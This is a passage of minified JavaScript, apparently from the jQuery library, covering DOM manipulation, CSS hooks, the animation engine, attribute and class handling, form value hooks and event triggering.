                    if (t.events) for (i in t.events) r[i] ? f.event.remove(n, i) : f.removeEvent(n, i, t.handle);
                    n[H.expando] = void 0
                }
                n[z.expando] && (n[z.expando] = void 0)
            }
        }
    }), f.fn.extend({
        domManip: ve, detach: function (e) {
            return ge(this, e, !0)
        }, remove: function (e) {
            return ge(this, e)
        }, text: function (e) {
            return $(this, (function (e) {
                return void 0 === e ? f.text(this) : this.empty().each((function () {
                    1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = e)
                }))
            }), null, e, arguments.length)
        }, append: function () {
            return ve(this, arguments, (function (e) {
                1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || pe(this, e).appendChild(e)
            }))
        }, prepend: function () {
            return ve(this, arguments, (function (e) {
                var t;
                1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (t = pe(this, e)).insertBefore(e, t.firstChild)
            }))
        }, before: function () {
            return ve(this, arguments, (function (e) {
                this.parentNode && this.parentNode.insertBefore(e, this)
            }))
        }, after: function () {
            return ve(this, arguments, (function (e) {
                this.parentNode && this.parentNode.insertBefore(e, this.nextSibling)
            }))
        }, empty: function () {
            for (var e, t = 0; null != (e = this[t]); t++) 1 === e.nodeType && (f.cleanData(K(e, !1)), e.textContent = "");
            return this
        }, clone: function (e, t) {
            return e = null != e && e, t = null == t ? e : t, this.map((function () {
                return f.clone(this, e, t)
            }))
        }, html: function (e) {
            return $(this, (function (e) {
                var t = this[0] || {}, n = 0, i = this.length;
                if (void 0 === e && 1 === t.nodeType) return t.innerHTML;
                if ("string" == typeof e && !le.test(e) && !U[(W.exec(e) || ["", ""])[1].toLowerCase()]) {
                    e = f.htmlPrefilter(e);
                    try {
                        for (; n < i; n++) 1 === (t = this[n] || {}).nodeType && (f.cleanData(K(t, !1)), t.innerHTML = e);
                        t = 0
                    } catch (e) {
                    }
                }
                t && this.empty().append(e)
            }), null, e, arguments.length)
        }, replaceWith: function () {
            var e = [];
            return ve(this, arguments, (function (t) {
                var n = this.parentNode;
                f.inArray(this, e) < 0 && (f.cleanData(K(this)), n && n.replaceChild(t, this))
            }), e)
        }
    }), f.each({
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith"
    }, (function (e, t) {
        f.fn[e] = function (e) {
            for (var n, i = [], r = f(e), a = r.length - 1, s = 0; s <= a; s++) n = s === a ? this : this.clone(!0), f(r[s])[t](n), o.apply(i, n.get());
            return this.pushStack(i)
        }
    }));
    var ye, be = {HTML: "block", BODY: "block"};

    function xe(e, t) {
        return e = f(t.createElement(e)).appendTo(t.body), t = f.css(e[0], "display"), e.detach(), t
    }

    function we(e) {
        var t = r, n = be[e];
        return n || ("none" !== (n = xe(e, t)) && n || ((t = (ye = (ye || f("<iframe frameborder='0' width='0' height='0'/>")).appendTo(t.documentElement))[0].contentDocument).write(), t.close(), n = xe(e, t), ye.detach()), be[e] = n), n
    }

    function Se(t) {
        var n = t.ownerDocument.defaultView;
        return (n = n && n.opener ? n : e).getComputedStyle(t)
    }

    function Ee(e, t, n, i) {
        var r, a = {};
        for (r in t) a[r] = e.style[r], e.style[r] = t[r];
        for (r in i = n.apply(e, i || []), t) e.style[r] = a[r];
        return i
    }

    var Ce, Te, ke, Pe, Me, Le, Ie = /^margin/, Ae = new RegExp("^(" + h + ")(?!px)[a-z%]+$", "i"),
        De = r.documentElement;

    function Ne() {
        Le.style.cssText = "-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%", Le.innerHTML = "", De.appendChild(Me);
        var t = e.getComputedStyle(Le);
        Ce = "1%" !== t.top, Pe = "2px" === t.marginLeft, Te = "4px" === t.width, Le.style.marginRight = "50%", ke = "4px" === t.marginRight, De.removeChild(Me)
    }

    function $e(e, t, n) {
        var i, r, a = e.style;
        return "" !== (r = (n = n || Se(e)) ? n.getPropertyValue(t) || n[t] : void 0) && void 0 !== r || f.contains(e.ownerDocument, e) || (r = f.style(e, t)), n && !p.pixelMarginRight() && Ae.test(r) && Ie.test(t) && (i = a.width, e = a.minWidth, t = a.maxWidth, a.minWidth = a.maxWidth = a.width = r, r = n.width, a.width = i, a.minWidth = e, a.maxWidth = t), void 0 !== r ? r + "" : r
    }

    function Oe(e, t) {
        return {
            get: function () {
                if (!e()) return (this.get = t).apply(this, arguments);
                delete this.get
            }
        }
    }

    Me = r.createElement("div"), (Le = r.createElement("div")).style && (Le.style.backgroundClip = "content-box", Le.cloneNode(!0).style.backgroundClip = "", p.clearCloneStyle = "content-box" === Le.style.backgroundClip, Me.style.cssText = "border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute", Me.appendChild(Le), f.extend(p, {
        pixelPosition: function () {
            return Ne(), Ce
        }, boxSizingReliable: function () {
            return null == Te && Ne(), Te
        }, pixelMarginRight: function () {
            return null == Te && Ne(), ke
        }, reliableMarginLeft: function () {
            return null == Te && Ne(), Pe
        }, reliableMarginRight: function () {
            var t, n = Le.appendChild(r.createElement("div"));
            return n.style.cssText = Le.style.cssText = "-webkit-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0", n.style.marginRight = n.style.width = "0", Le.style.width = "1px", De.appendChild(Me), t = !parseFloat(e.getComputedStyle(n).marginRight), De.removeChild(Me), Le.removeChild(n), t
        }
    }));
    var _e = /^(none|table(?!-c[ea]).+)/, He = {position: "absolute", visibility: "hidden", display: "block"},
        ze = {letterSpacing: "0", fontWeight: "400"}, Be = ["Webkit", "O", "Moz", "ms"],
        Fe = r.createElement("div").style;

    function Re(e) {
        if (e in Fe) return e;
        for (var t = e[0].toUpperCase() + e.slice(1), n = Be.length; n--;) if ((e = Be[n] + t) in Fe) return e
    }

    function je(e, t, n) {
        var i = q.exec(t);
        return i ? Math.max(0, i[2] - (n || 0)) + (i[3] || "px") : t
    }

    function qe(e, t, n, i, r) {
        for (var a = n === (i ? "border" : "content") ? 4 : "width" === t ? 1 : 0, s = 0; a < 4; a += 2) "margin" === n && (s += f.css(e, n + V[a], !0, r)), i ? ("content" === n && (s -= f.css(e, "padding" + V[a], !0, r)), "margin" !== n && (s -= f.css(e, "border" + V[a] + "Width", !0, r))) : (s += f.css(e, "padding" + V[a], !0, r), "padding" !== n && (s += f.css(e, "border" + V[a] + "Width", !0, r)));
        return s
    }

    function Ve(e, t, n) {
        var i = !0, r = "width" === t ? e.offsetWidth : e.offsetHeight, a = Se(e),
            s = "border-box" === f.css(e, "boxSizing", !1, a);
        if (r <= 0 || null == r) {
            if (((r = $e(e, t, a)) < 0 || null == r) && (r = e.style[t]), Ae.test(r)) return r;
            i = s && (p.boxSizingReliable() || r === e.style[t]), r = parseFloat(r) || 0
        }
        return r + qe(e, t, n || (s ? "border" : "content"), i, a) + "px"
    }

    function Ge(e, t) {
        for (var n, i, r, a = [], s = 0, o = e.length; s < o; s++) (i = e[s]).style && (a[s] = H.get(i, "olddisplay"), n = i.style.display, t ? (a[s] || "none" !== n || (i.style.display = ""), "" === i.style.display && j(i) && (a[s] = H.access(i, "olddisplay", we(i.nodeName)))) : (r = j(i), "none" === n && r || H.set(i, "olddisplay", r ? n : f.css(i, "display"))));
        for (s = 0; s < o; s++) (i = e[s]).style && (t && "none" !== i.style.display && "" !== i.style.display || (i.style.display = t ? a[s] || "" : "none"));
        return e
    }

    function Xe(e, t, n, i, r) {
        return new Xe.prototype.init(e, t, n, i, r)
    }

    f.extend({
        cssHooks: {
            opacity: {
                get: function (e, t) {
                    if (t) return "" === (e = $e(e, "opacity")) ? "1" : e
                }
            }
        },
        cssNumber: {
            animationIterationCount: !0,
            columnCount: !0,
            fillOpacity: !0,
            flexGrow: !0,
            flexShrink: !0,
            fontWeight: !0,
            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0
        },
        cssProps: {float: "cssFloat"},
        style: function (e, t, n, i) {
            if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                var r, a, s, o = f.camelCase(t), l = e.style;
                if (t = f.cssProps[o] || (f.cssProps[o] = Re(o) || o), s = f.cssHooks[t] || f.cssHooks[o], void 0 === n) return s && "get" in s && void 0 !== (r = s.get(e, !1, i)) ? r : l[t];
                "string" == (a = typeof n) && (r = q.exec(n)) && r[1] && (n = G(e, t, r), a = "number"), null != n && n == n && ("number" === a && (n += r && r[3] || (f.cssNumber[o] ? "" : "px")), p.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (l[t] = "inherit"), s && "set" in s && void 0 === (n = s.set(e, n, i)) || (l[t] = n))
            }
        },
        css: function (e, t, n, i) {
            var r, a = f.camelCase(t);
            return t = f.cssProps[a] || (f.cssProps[a] = Re(a) || a), "normal" === (r = void 0 === (r = (a = f.cssHooks[t] || f.cssHooks[a]) && "get" in a ? a.get(e, !0, n) : r) ? $e(e, t, i) : r) && t in ze && (r = ze[t]), "" === n || n ? (t = parseFloat(r), !0 === n || isFinite(t) ? t || 0 : r) : r
        }
    }), f.each(["height", "width"], (function (e, t) {
        f.cssHooks[t] = {
            get: function (e, n, i) {
                if (n) return _e.test(f.css(e, "display")) && 0 === e.offsetWidth ? Ee(e, He, (function () {
                    return Ve(e, t, i)
                })) : Ve(e, t, i)
            }, set: function (e, n, i) {
                var r, a = i && Se(e);
                return (a = i && qe(e, t, i, "border-box" === f.css(e, "boxSizing", !1, a), a)) && (r = q.exec(n)) && "px" !== (r[3] || "px") && (e.style[t] = n, n = f.css(e, t)), je(0, n, a)
            }
        }
    })), f.cssHooks.marginLeft = Oe(p.reliableMarginLeft, (function (e, t) {
        if (t) return (parseFloat($e(e, "marginLeft")) || e.getBoundingClientRect().left - Ee(e, {marginLeft: 0}, (function () {
            return e.getBoundingClientRect().left
        }))) + "px"
    })), f.cssHooks.marginRight = Oe(p.reliableMarginRight, (function (e, t) {
        if (t) return Ee(e, {display: "inline-block"}, $e, [e, "marginRight"])
    })), f.each({margin: "", padding: "", border: "Width"}, (function (e, t) {
        f.cssHooks[e + t] = {
            expand: function (n) {
                for (var i = 0, r = {}, a = "string" == typeof n ? n.split(" ") : [n]; i < 4; i++) r[e + V[i] + t] = a[i] || a[i - 2] || a[0];
                return r
            }
        }, Ie.test(e) || (f.cssHooks[e + t].set = je)
    })), f.fn.extend({
        css: function (e, t) {
            return $(this, (function (e, t, n) {
                var i, r, a = {}, s = 0;
                if (f.isArray(t)) {
                    for (i = Se(e), r = t.length; s < r; s++) a[t[s]] = f.css(e, t[s], !1, i);
                    return a
                }
                return void 0 !== n ? f.style(e, t, n) : f.css(e, t)
            }), e, t, 1 < arguments.length)
        }, show: function () {
            return Ge(this, !0)
        }, hide: function () {
            return Ge(this)
        }, toggle: function (e) {
            return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each((function () {
                j(this) ? f(this).show() : f(this).hide()
            }))
        }
    }), ((f.Tween = Xe).prototype = {
        constructor: Xe, init: function (e, t, n, i, r, a) {
            this.elem = e, this.prop = n, this.easing = r || f.easing._default, this.options = t, this.start = this.now = this.cur(), this.end = i, this.unit = a || (f.cssNumber[n] ? "" : "px")
        }, cur: function () {
            var e = Xe.propHooks[this.prop];
            return (e && e.get ? e : Xe.propHooks._default).get(this)
        }, run: function (e) {
            var t, n = Xe.propHooks[this.prop];
            return this.options.duration ? this.pos = t = f.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), (n && n.set ? n : Xe.propHooks._default).set(this), this
        }
    }).init.prototype = Xe.prototype, (Xe.propHooks = {
        _default: {
            get: function (e) {
                return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (e = f.css(e.elem, e.prop, "")) && "auto" !== e ? e : 0
            }, set: function (e) {
                f.fx.step[e.prop] ? f.fx.step[e.prop](e) : 1 !== e.elem.nodeType || null == e.elem.style[f.cssProps[e.prop]] && !f.cssHooks[e.prop] ? e.elem[e.prop] = e.now : f.style(e.elem, e.prop, e.now + e.unit)
            }
        }
    }).scrollTop = Xe.propHooks.scrollLeft = {
        set: function (e) {
            e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
        }
    }, f.easing = {
        linear: function (e) {
            return e
        }, swing: function (e) {
            return .5 - Math.cos(e * Math.PI) / 2
        }, _default: "swing"
    }, f.fx = Xe.prototype.init, f.fx.step = {};
    var We, Ye, Ue = /^(?:toggle|show|hide)$/, Ke = /queueHooks$/;

    function Qe() {
        return e.setTimeout((function () {
            We = void 0
        })), We = f.now()
    }

    function Je(e, t) {
        var n, i = 0, r = {height: e};
        for (t = t ? 1 : 0; i < 4; i += 2 - t) r["margin" + (n = V[i])] = r["padding" + n] = e;
        return t && (r.opacity = r.width = e), r
    }

    function Ze(e, t, n) {
        for (var i, r = (et.tweeners[t] || []).concat(et.tweeners["*"]), a = 0, s = r.length; a < s; a++) if (i = r[a].call(n, t, e)) return i
    }

    function et(e, t, n) {
        var i, r, a = 0, s = et.prefilters.length, o = f.Deferred().always((function () {
            delete l.elem
        })), l = function () {
            if (r) return !1;
            for (var t = We || Qe(), n = 1 - ((t = Math.max(0, c.startTime + c.duration - t)) / c.duration || 0), i = 0, a = c.tweens.length; i < a; i++) c.tweens[i].run(n);
            return o.notifyWith(e, [c, n, t]), n < 1 && a ? t : (o.resolveWith(e, [c]), !1)
        }, c = o.promise({
            elem: e,
            props: f.extend({}, t),
            opts: f.extend(!0, {specialEasing: {}, easing: f.easing._default}, n),
            originalProperties: t,
            originalOptions: n,
            startTime: We || Qe(),
            duration: n.duration,
            tweens: [],
            createTween: function (t, n) {
                return t = f.Tween(e, c.opts, t, n, c.opts.specialEasing[t] || c.opts.easing), c.tweens.push(t), t
            },
            stop: function (t) {
                var n = 0, i = t ? c.tweens.length : 0;
                if (r) return this;
                for (r = !0; n < i; n++) c.tweens[n].run(1);
                return t ? (o.notifyWith(e, [c, 1, 0]), o.resolveWith(e, [c, t])) : o.rejectWith(e, [c, t]), this
            }
        }), u = c.props;
        for (function (e, t) {
            var n, i, r, a, s;
            for (n in e) if (r = t[i = f.camelCase(n)], a = e[n], f.isArray(a) && (r = a[1], a = e[n] = a[0]), n !== i && (e[i] = a, delete e[n]), (s = f.cssHooks[i]) && "expand" in s) for (n in a = s.expand(a), delete e[i], a) n in e || (e[n] = a[n], t[n] = r); else t[i] = r
        }(u, c.opts.specialEasing); a < s; a++) if (i = et.prefilters[a].call(c, e, u, c.opts)) return f.isFunction(i.stop) && (f._queueHooks(c.elem, c.opts.queue).stop = f.proxy(i.stop, i)), i;
        return f.map(u, Ze, c), f.isFunction(c.opts.start) && c.opts.start.call(e, c), f.fx.timer(f.extend(l, {
            elem: e,
            anim: c,
            queue: c.opts.queue
        })), c.progress(c.opts.progress).done(c.opts.done, c.opts.complete).fail(c.opts.fail).always(c.opts.always)
    }

    f.Animation = f.extend(et, {
        tweeners: {
            "*": [function (e, t) {
                var n = this.createTween(e, t);
                return G(n.elem, e, q.exec(t), n), n
            }]
        }, tweener: function (e, t) {
            for (var n, i = 0, r = (e = f.isFunction(e) ? (t = e, ["*"]) : e.match(D)).length; i < r; i++) n = e[i], et.tweeners[n] = et.tweeners[n] || [], et.tweeners[n].unshift(t)
        }, prefilters: [function (e, t, n) {
            var i, r, a, s, o, l, c, u = this, d = {}, p = e.style, h = e.nodeType && j(e), m = H.get(e, "fxshow");
            for (i in n.queue || (null == (o = f._queueHooks(e, "fx")).unqueued && (o.unqueued = 0, l = o.empty.fire, o.empty.fire = function () {
                o.unqueued || l()
            }), o.unqueued++, u.always((function () {
                u.always((function () {
                    o.unqueued--, f.queue(e, "fx").length || o.empty.fire()
                }))
            }))), 1 === e.nodeType && ("height" in t || "width" in t) && (n.overflow = [p.overflow, p.overflowX, p.overflowY], "inline" === ("none" === (c = f.css(e, "display")) ? H.get(e, "olddisplay") || we(e.nodeName) : c) && "none" === f.css(e, "float") && (p.display = "inline-block")), n.overflow && (p.overflow = "hidden", u.always((function () {
                p.overflow = n.overflow[0], p.overflowX = n.overflow[1], p.overflowY = n.overflow[2]
            }))), t) if (r = t[i], Ue.exec(r)) {
                if (delete t[i], a = a || "toggle" === r, r === (h ? "hide" : "show")) {
                    if ("show" !== r || !m || void 0 === m[i]) continue;
                    h = !0
                }
                d[i] = m && m[i] || f.style(e, i)
            } else c = void 0;
            if (f.isEmptyObject(d)) "inline" === ("none" === c ? we(e.nodeName) : c) && (p.display = c); else for (i in m ? "hidden" in m && (h = m.hidden) : m = H.access(e, "fxshow", {}), a && (m.hidden = !h), h ? f(e).show() : u.done((function () {
                f(e).hide()
            })), u.done((function () {
                for (var t in H.remove(e, "fxshow"), d) f.style(e, t, d[t])
            })), d) s = Ze(h ? m[i] : 0, i, u), i in m || (m[i] = s.start, h && (s.end = s.start, s.start = "width" === i || "height" === i ? 1 : 0))
        }], prefilter: function (e, t) {
            t ? et.prefilters.unshift(e) : et.prefilters.push(e)
        }
    }), f.speed = function (e, t, n) {
        var i = e && "object" == typeof e ? f.extend({}, e) : {
            complete: n || !n && t || f.isFunction(e) && e,
            duration: e,
            easing: n && t || t && !f.isFunction(t) && t
        };
        return i.duration = f.fx.off ? 0 : "number" == typeof i.duration ? i.duration : i.duration in f.fx.speeds ? f.fx.speeds[i.duration] : f.fx.speeds._default, null != i.queue && !0 !== i.queue || (i.queue = "fx"), i.old = i.complete, i.complete = function () {
            f.isFunction(i.old) && i.old.call(this), i.queue && f.dequeue(this, i.queue)
        }, i
    }, f.fn.extend({
        fadeTo: function (e, t, n, i) {
            return this.filter(j).css("opacity", 0).show().end().animate({opacity: t}, e, n, i)
        }, animate: function (e, t, n, i) {
            var r = f.isEmptyObject(e), a = f.speed(t, n, i);
            return (i = function () {
                var t = et(this, f.extend({}, e), a);
                (r || H.get(this, "finish")) && t.stop(!0)
            }).finish = i, r || !1 === a.queue ? this.each(i) : this.queue(a.queue, i)
        }, stop: function (e, t, n) {
            function i(e) {
                var t = e.stop;
                delete e.stop, t(n)
            }

            return "string" != typeof e && (n = t, t = e, e = void 0), t && !1 !== e && this.queue(e || "fx", []), this.each((function () {
                var t = !0, r = null != e && e + "queueHooks", a = f.timers, s = H.get(this);
                if (r) s[r] && s[r].stop && i(s[r]); else for (r in s) s[r] && s[r].stop && Ke.test(r) && i(s[r]);
                for (r = a.length; r--;) a[r].elem !== this || null != e && a[r].queue !== e || (a[r].anim.stop(n), t = !1, a.splice(r, 1));
                !t && n || f.dequeue(this, e)
            }))
        }, finish: function (e) {
            return !1 !== e && (e = e || "fx"), this.each((function () {
                var t, n = H.get(this), i = n[e + "queue"], r = n[e + "queueHooks"], a = f.timers, s = i ? i.length : 0;
                for (n.finish = !0, f.queue(this, e, []), r && r.stop && r.stop.call(this, !0), t = a.length; t--;) a[t].elem === this && a[t].queue === e && (a[t].anim.stop(!0), a.splice(t, 1));
                for (t = 0; t < s; t++) i[t] && i[t].finish && i[t].finish.call(this);
                delete n.finish
            }))
        }
    }), f.each(["toggle", "show", "hide"], (function (e, t) {
        var n = f.fn[t];
        f.fn[t] = function (e, i, r) {
            return null == e || "boolean" == typeof e ? n.apply(this, arguments) : this.animate(Je(t, !0), e, i, r)
        }
    })), f.each({
        slideDown: Je("show"),
        slideUp: Je("hide"),
        slideToggle: Je("toggle"),
        fadeIn: {opacity: "show"},
        fadeOut: {opacity: "hide"},
        fadeToggle: {opacity: "toggle"}
    }, (function (e, t) {
        f.fn[e] = function (e, n, i) {
            return this.animate(t, e, n, i)
        }
    })), f.timers = [], f.fx.tick = function () {
        var e, t = 0, n = f.timers;
        for (We = f.now(); t < n.length; t++) (e = n[t])() || n[t] !== e || n.splice(t--, 1);
        n.length || f.fx.stop(), We = void 0
    }, f.fx.timer = function (e) {
        f.timers.push(e), e() ? f.fx.start() : f.timers.pop()
    }, f.fx.interval = 13, f.fx.start = function () {
        Ye = Ye || e.setInterval(f.fx.tick, f.fx.interval)
    }, f.fx.stop = function () {
        e.clearInterval(Ye), Ye = null
    }, f.fx.speeds = {slow: 600, fast: 200, _default: 400}, f.fn.delay = function (t, n) {
        return t = f.fx && f.fx.speeds[t] || t, this.queue(n = n || "fx", (function (n, i) {
            var r = e.setTimeout(n, t);
            i.stop = function () {
                e.clearTimeout(r)
            }
        }))
    }, b = r.createElement("input"), h = (i = r.createElement("select")).appendChild(r.createElement("option")), b.type = "checkbox", p.checkOn = "" !== b.value, p.optSelected = h.selected, i.disabled = !0, p.optDisabled = !h.disabled, (b = r.createElement("input")).value = "t", b.type = "radio", p.radioValue = "t" === b.value;
    var tt, nt = f.expr.attrHandle;
    f.fn.extend({
        attr: function (e, t) {
            return $(this, f.attr, e, t, 1 < arguments.length)
        }, removeAttr: function (e) {
            return this.each((function () {
                f.removeAttr(this, e)
            }))
        }
    }), f.extend({
        attr: function (e, t, n) {
            var i, r, a = e.nodeType;
            if (3 !== a && 8 !== a && 2 !== a) return void 0 === e.getAttribute ? f.prop(e, t, n) : (1 === a && f.isXMLDoc(e) || (t = t.toLowerCase(), r = f.attrHooks[t] || (f.expr.match.bool.test(t) ? tt : void 0)), void 0 !== n ? null === n ? void f.removeAttr(e, t) : r && "set" in r && void 0 !== (i = r.set(e, n, t)) ? i : (e.setAttribute(t, n + ""), n) : r && "get" in r && null !== (i = r.get(e, t)) || null != (i = f.find.attr(e, t)) ? i : void 0)
        }, attrHooks: {
            type: {
                set: function (e, t) {
                    if (!p.radioValue && "radio" === t && f.nodeName(e, "input")) {
                        var n = e.value;
                        return e.setAttribute("type", t), n && (e.value = n), t
                    }
                }
            }
        }, removeAttr: function (e, t) {
            var n, i, r = 0, a = t && t.match(D);
            if (a && 1 === e.nodeType) for (; n = a[r++];) i = f.propFix[n] || n, f.expr.match.bool.test(n) && (e[i] = !1), e.removeAttribute(n)
        }
    }), tt = {
        set: function (e, t, n) {
            return !1 === t ? f.removeAttr(e, n) : e.setAttribute(n, n), n
        }
    }, f.each(f.expr.match.bool.source.match(/\w+/g), (function (e, t) {
        var n = nt[t] || f.find.attr;
        nt[t] = function (e, t, i) {
            var r, a;
            return i || (a = nt[t], nt[t] = r, r = null != n(e, t, i) ? t.toLowerCase() : null, nt[t] = a), r
        }
    }));
    var it = /^(?:input|select|textarea|button)$/i, rt = /^(?:a|area)$/i;
    f.fn.extend({
        prop: function (e, t) {
            return $(this, f.prop, e, t, 1 < arguments.length)
        }, removeProp: function (e) {
            return this.each((function () {
                delete this[f.propFix[e] || e]
            }))
        }
    }), f.extend({
        prop: function (e, t, n) {
            var i, r, a = e.nodeType;
            if (3 !== a && 8 !== a && 2 !== a) return 1 === a && f.isXMLDoc(e) || (t = f.propFix[t] || t, r = f.propHooks[t]), void 0 !== n ? r && "set" in r && void 0 !== (i = r.set(e, n, t)) ? i : e[t] = n : r && "get" in r && null !== (i = r.get(e, t)) ? i : e[t]
        }, propHooks: {
            tabIndex: {
                get: function (e) {
                    var t = f.find.attr(e, "tabindex");
                    return t ? parseInt(t, 10) : it.test(e.nodeName) || rt.test(e.nodeName) && e.href ? 0 : -1
                }
            }
        }, propFix: {for: "htmlFor", class: "className"}
    }), p.optSelected || (f.propHooks.selected = {
        get: function (e) {
            return (e = e.parentNode) && e.parentNode && e.parentNode.selectedIndex, null
        }, set: function (e) {
            (e = e.parentNode) && (e.selectedIndex, e.parentNode && e.parentNode.selectedIndex)
        }
    }), f.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], (function () {
        f.propFix[this.toLowerCase()] = this
    }));
    var at = /[\t\r\n\f]/g;

    function st(e) {
        return e.getAttribute && e.getAttribute("class") || ""
    }

    f.fn.extend({
        addClass: function (e) {
            var t, n, i, r, a, s, o = 0;
            if (f.isFunction(e)) return this.each((function (t) {
                f(this).addClass(e.call(this, t, st(this)))
            }));
            if ("string" == typeof e && e) for (t = e.match(D) || []; n = this[o++];) if (s = st(n), i = 1 === n.nodeType && (" " + s + " ").replace(at, " ")) {
                for (a = 0; r = t[a++];) i.indexOf(" " + r + " ") < 0 && (i += r + " ");
                s !== (s = f.trim(i)) && n.setAttribute("class", s)
            }
            return this
        }, removeClass: function (e) {
            var t, n, i, r, a, s, o = 0;
            if (f.isFunction(e)) return this.each((function (t) {
                f(this).removeClass(e.call(this, t, st(this)))
            }));
            if (!arguments.length) return this.attr("class", "");
            if ("string" == typeof e && e) for (t = e.match(D) || []; n = this[o++];) if (s = st(n), i = 1 === n.nodeType && (" " + s + " ").replace(at, " ")) {
                for (a = 0; r = t[a++];) for (; -1 < i.indexOf(" " + r + " ");) i = i.replace(" " + r + " ", " ");
                s !== (s = f.trim(i)) && n.setAttribute("class", s)
            }
            return this
        }, toggleClass: function (e, t) {
            var n = typeof e;
            return "boolean" == typeof t && "string" == n ? t ? this.addClass(e) : this.removeClass(e) : f.isFunction(e) ? this.each((function (n) {
                f(this).toggleClass(e.call(this, n, st(this), t), t)
            })) : this.each((function () {
                var t, i, r, a;
                if ("string" == n) for (i = 0, r = f(this), a = e.match(D) || []; t = a[i++];) r.hasClass(t) ? r.removeClass(t) : r.addClass(t); else void 0 !== e && "boolean" != n || ((t = st(this)) && H.set(this, "__className__", t), this.setAttribute && this.setAttribute("class", !t && !1 !== e && H.get(this, "__className__") || ""))
            }))
        }, hasClass: function (e) {
            for (var t, n = 0, i = " " + e + " "; t = this[n++];) if (1 === t.nodeType && -1 < (" " + st(t) + " ").replace(at, " ").indexOf(i)) return !0;
            return !1
        }
    });
    var ot = /\r/g, lt = /[\x20\t\r\n\f]+/g;
    f.fn.extend({
        val: function (e) {
            var t, n, i, r = this[0];
            return arguments.length ? (i = f.isFunction(e), this.each((function (n) {
                1 === this.nodeType && (null == (n = i ? e.call(this, n, f(this).val()) : e) ? n = "" : "number" == typeof n ? n += "" : f.isArray(n) && (n = f.map(n, (function (e) {
                    return null == e ? "" : e + ""
                }))), (t = f.valHooks[this.type] || f.valHooks[this.nodeName.toLowerCase()]) && "set" in t && void 0 !== t.set(this, n, "value") || (this.value = n))
            }))) : r ? (t = f.valHooks[r.type] || f.valHooks[r.nodeName.toLowerCase()]) && "get" in t && void 0 !== (n = t.get(r, "value")) ? n : "string" == typeof (n = r.value) ? n.replace(ot, "") : null == n ? "" : n : void 0
        }
    }), f.extend({
        valHooks: {
            option: {
                get: function (e) {
                    var t = f.find.attr(e, "value");
                    return null != t ? t : f.trim(f.text(e)).replace(lt, " ")
                }
            }, select: {
                get: function (e) {
                    for (var t, n = e.options, i = e.selectedIndex, r = "select-one" === e.type || i < 0, a = r ? null : [], s = r ? i + 1 : n.length, o = i < 0 ? s : r ? i : 0; o < s; o++) if (((t = n[o]).selected || o === i) && (p.optDisabled ? !t.disabled : null === t.getAttribute("disabled")) && (!t.parentNode.disabled || !f.nodeName(t.parentNode, "optgroup"))) {
                        if (t = f(t).val(), r) return t;
                        a.push(t)
                    }
                    return a
                }, set: function (e, t) {
                    for (var n, i, r = e.options, a = f.makeArray(t), s = r.length; s--;) ((i = r[s]).selected = -1 < f.inArray(f.valHooks.option.get(i), a)) && (n = !0);
                    return n || (e.selectedIndex = -1), a
                }
            }
        }
    }), f.each(["radio", "checkbox"], (function () {
        f.valHooks[this] = {
            set: function (e, t) {
                if (f.isArray(t)) return e.checked = -1 < f.inArray(f(e).val(), t)
            }
        }, p.checkOn || (f.valHooks[this].get = function (e) {
            return null === e.getAttribute("value") ? "on" : e.value
        })
    }));
    var ct = /^(?:focusinfocus|focusoutblur)$/;
    f.extend(f.event, {
        trigger: function (t, n, i, a) {
            var s, o, l, c, u, p, h = [i || r], m = d.call(t, "type") ? t.type : t,
                v = d.call(t, "namespace") ? t.namespace.split(".") : [], g = o = i = i || r;
            if (3 !== i.nodeType && 8 !== i.nodeType && !ct.test(m + f.event.triggered) && (-1 < m.indexOf(".") && (m = (v = m.split(".")).shift(), v.sort()), c = m.indexOf(":") < 0 && "on" + m, (t = t[f.expando] ? t : new f.Event(m, "object" == typeof t && t)).isTrigger = a ? 2 : 3, t.namespace = v.join("."), t.rnamespace = t.namespace ? new RegExp("(^|\\.)" + v.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, t.result = void 0, t.target || (t.target = i), n = null == n ? [t] : f.makeArray(n, [t]), p = f.event.special[m] || {}, a || !p.trigger || !1 !== p.trigger.apply(i, n))) {
                if (!a && !p.noBubble && !f.isWindow(i)) {
                    for (l = p.delegateType || m, ct.test(l + m) || (g = g.parentNode); g; g = g.parentNode) h.push(g), o = g;
                    o === (i.ownerDocument || r) && h.push(o.defaultView || o.parentWindow || e)
                }
                for (s = 0; (g = h[s++]) && !t.isPropagationStopped();) t.type = 1 < s ? l : p.bindType || m, (u = (H.get(g, "events") || {})[t.type] && H.get(g, "handle")) && u.apply(g, n), (u = c && g[c]) && u.apply && O(g) && (t.result = u.apply(g, n), !1 === t.result && t.preventDefault());
                return t.type = m, a || t.isDefaultPrevented() || p._default && !1 !== p._default.apply(h.pop(), n) || !O(i) || c && f.isFunction(i[m]) && !f.isWindow(i) && ((o = i[c]) && (i[c] = null), i[f.event.triggered = m](), f.event.triggered = void 0, o && (i[c] = o)), t.result
            }
        }, simulate: function (e, t, n) {
            e = f.extend(new f.Event, n, {type: e, isSimulated: !0}), f.event.trigger(e, null, t)
        }
    }), f.fn.extend({
        trigger: function (e, t) {
            return this.each((function () {
                f.event.trigger(e, t, this)
            }))
        }, triggerHandler: function (e, t) {
            var n = this[0];
            if (n) return f.event.trigger(e, t, n, !0)
        }
